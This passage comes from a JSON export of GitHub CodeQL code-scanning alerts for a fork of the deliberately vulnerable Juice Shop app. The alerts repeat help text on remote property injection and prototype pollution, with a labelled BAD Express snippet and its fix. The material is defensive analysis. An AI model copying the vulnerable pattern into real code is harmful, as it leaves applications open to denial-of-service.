fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."},"location":{"path":"routes/vulnCodeFixes.ts","start_line":39,"end_line":39,"start_column":13,"end_column":16},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/94/instances"},{"number":93,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/93","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/93","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/remote-property-injection","severity":"warning","description":"Remote property injection","name":"js/remote-property-injection","tags":["external/cwe/cwe-250","external/cwe/cwe-400","security"],"full_description":"Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.","help":"# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."},"location":{"path":"lib/insecurity.ts","start_line":77,"end_line":77,"start_column":16,"end_column":28},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/93/instances"},{"number":92,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/92","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/92","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/remote-property-injection","severity":"warning","description":"Remote property injection","name":"js/remote-property-injection","tags":["external/cwe/cwe-250","external/cwe/cwe-400","security"],"full_description":"Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.","help":"# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."},"location":{"path":"lib/insecurity.ts","start_line":76,"end_line":76,"start_column":19,"end_column":24},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/92/instances"}]